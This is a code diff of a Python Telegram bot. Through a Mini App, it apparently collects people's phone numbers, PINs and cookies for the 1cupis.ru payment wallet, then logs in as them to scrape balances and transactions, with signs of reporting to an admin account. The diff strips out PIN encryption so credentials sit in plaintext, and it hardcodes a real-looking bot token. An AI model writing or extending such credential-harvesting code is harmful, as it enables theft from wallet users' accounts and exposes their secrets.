@@ -1,36 +1,26 @@
 # bot.py
-import asyncio
 import json
 import logging
 import sqlite3
 from datetime import datetime
-from pathlib import Path
 
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
 from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, MessageHandler, filters
 from bs4 import BeautifulSoup
 import requests
-from cryptography.fernet import Fernet
 
 # === Настройки ===
-TOKEN = "YOUR_BOT_TOKEN"  # ← ВСТАВЬ СВОЙ
+TOKEN = "8227735572:AAE8flxfp77FfHjn_qdSS09oE_Iuu2zcdDk"  # ← ВСТАВЬ СВОЙ
 ADMIN_ID = 123456789  # ← ВСТАВЬ ID АДМИНА
-WEBAPP_URL = "https://your-vercel-app.vercel.app/webapp.html"  # ← ТВОЯ ССЫЛКА
+WEBAPP_URL = "https://art3vil.github.io/cupis/" # ← ТВОЯ ССЫЛКА
 
 # === Логи ===
 logging.basicConfig(level=logging.INFO)
 
-# === Шифрование ===
-KEY_FILE = "secret.key"
-if not Path(KEY_FILE).exists():
-    key = Fernet.generate_key()
-    Path(KEY_FILE).write_bytes(key)
-else:
-    key = Path(KEY_FILE).read_bytes()
-cipher = Fernet(key)
-
 # === БД ===
 DB = "users.db"
+
+
 def init_db():
     conn = sqlite3.connect(DB)
     c = conn.cursor()
@@ -39,7 +29,7 @@ def init_db():
             chat_id INTEGER PRIMARY KEY,
             username TEXT,
             phone TEXT,
-            pin_enc TEXT,
+            pin TEXT,
             cookies TEXT,
             updated_at TEXT
         )
@@ -47,55 +37,116 @@ def init_db():
     conn.commit()
     conn.close()
 
+
 # === Сохранение/чтение ===
 def save_user(chat_id, username, phone, pin, cookies):
     conn = sqlite3.connect(DB)
     c = conn.cursor()
     c.execute('''
         INSERT OR REPLACE INTO users 
-        (chat_id, username, phone, pin_enc, cookies, updated_at)
+        (chat_id, username, phone, pin, cookies, updated_at)
         VALUES (?, ?, ?, ?, ?, ?)
     ''', (
         chat_id,
         username,
         phone,
-        cipher.encrypt(pin.encode()).decode(),
+        pin,
         cookies,
         datetime.now().isoformat()
     ))
     conn.commit()
     conn.close()
 
+
 def get_user(chat_id):
     conn = sqlite3.connect(DB)
     c = conn.cursor()
-    c.execute("SELECT phone, pin_enc, cookies FROM users WHERE chat_id = ?", (chat_id,))
+    c.execute("SELECT phone, pin, cookies FROM users WHERE chat_id = ?", (chat_id,))
     row = c.fetchone()
     conn.close()
     if row:
-        phone, pin_enc, cookies = row
+        phone, pin, cookies = row
         return {
             'phone': phone,
-            'pin': cipher.decrypt(pin_enc.encode()).decode(),
+            'pin': pin,
             'cookies': cookies
         }
     return None
 
-# === Парсинг баланса ===
-def get_balance_with_session(cookies_str):
+
+# === Авторизация через API ===
+def login_with_credentials(phone, pin):
+    """Авторизация на сайте через телефон и PIN"""
     try:
         session = requests.Session()
-        cookies = {}
-        for item in cookies_str.split('; '):
-            if '=' in item:
-                k, v = item.split('=', 1)
-                cookies[k] = v
-        for k, v in cookies.items():
-            session.cookies.set(k, v, domain='.1cupis.ru')
 
+        # Получаем страницу авторизации для получения CSRF токена
+        login_page = session.get("https://wallet.1cupis.ru/", timeout=10)
+        soup = BeautifulSoup(login_page.text, 'html.parser')
+
+        # Пробуем найти форму авторизации и отправить данные
+        # Это примерный код - нужно адаптировать под реальный API сайта
+        login_data = {
+            'phone': phone,
+            'pin': pin,
+        }
+
+        # Попытка авторизации (адаптируй под реальный endpoint)
+        response = session.post(
+            "https://wallet.1cupis.ru/api/login",  # Замени на реальный URL
+            data=login_data,
+            timeout=10,
+            allow_redirects=True
+        )
+
+        # Если авторизация успешна, возвращаем cookies
+        if response.status_code == 200 or 'кабинет' in response.url.lower():
+            cookies_str = '; '.join([f"{k}={v}" for k, v in session.cookies.items()])
+            return cookies_str
+
+        return None
+    except Exception as e:
+        logging.error(f"Ошибка авторизации: {e}")
+        return None
+
+
+# === Парсинг баланса ===
+def get_balance_with_session(cookies_str=None, phone=None, pin=None):
+    """
+    Получает баланс через cookies или авторизуется через API
+    """
+    try:
+        session = requests.Session()
+
+        # Если cookies предоставлены, используем их
+        if cookies_str and cookies_str.strip():
+            cookies = {}
+            for item in cookies_str.split('; '):
+                if '=' in item:
+                    k, v = item.split('=', 1)
+                    cookies[k] = v
+            for k, v in cookies.items():
+                session.cookies.set(k, v, domain='.1cupis.ru')
+        # Если cookies нет, но есть телефон и PIN, авторизуемся
+        elif phone and pin:
+            cookies_str = login_with_credentials(phone, pin)
+            if not cookies_str:
+                return None  # Авторизация не удалась
+            # Парсим полученные cookies
+            cookies = {}
+            for item in cookies_str.split('; '):
+                if '=' in item:
+                    k, v = item.split('=', 1)
+                    cookies[k] = v
+            for k, v in cookies.items():
+                session.cookies.set(k, v, domain='.1cupis.ru')
+        else:
+            return None
+
+        # Получаем страницу кабинета
         response = session.get("https://wallet.1cupis.ru/cabinet", timeout=10)
-        if "авторизация" in response.text.lower():
-            return None  # Сессия устарела
+        if "авторизация" in response.text.lower() or response.status_code == 401:
+            return None  # Сессия устарела или не авторизован
 
         soup = BeautifulSoup(response.text, 'html.parser')
 
@@ -114,8 +165,10 @@ def get_balance_with_session(cookies_str):
             'balance': balance,
             'transactions': transactions
         }
-    except:
+    except Exception as e:
+        logging.error(f"Ошибка получения баланса: {e}")
         return None
+
 
 # === Команды ===
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -133,6 +186,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         reply_markup=reply_markup
     )
 
+
 async def balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_data = get_user(update.effective_user.id)
     if not user_data:
@@ -141,9 +195,14 @@ async def balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     await update.message.reply_text("Проверяю баланс...")
 
-    data = get_balance_with_session(user_data['cookies'])
+    # Пробуем получить баланс через cookies или через авторизацию
+    data = get_balance_with_session(
+        cookies_str=user_data.get('cookies'),
+        phone=user_data.get('phone'),
+        pin=user_data.get('pin')
+    )
     if not data:
-        await update.message.reply_text("Сессия устарела. Пройдите вход заново: /start")
+        await update.message.reply_text("Не удалось получить баланс. Проверьте данные и попробуйте снова: /start")
         return
 
     msg = f"**ВАШ БАЛАНС**\n\n"
@@ -170,6 +229,7 @@ async def balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
     except:
         pass  # Админ заблокировал бота
+
 
 # === Обработка Mini App ===
 async def handle_webapp(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -211,6 +271,7 @@ async def handle_webapp(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     except Exception as e:
         await update.message.reply_text(f"Ошибка: {e}")
+
 
 # === Запуск ===
 if __name__ == "__main__":
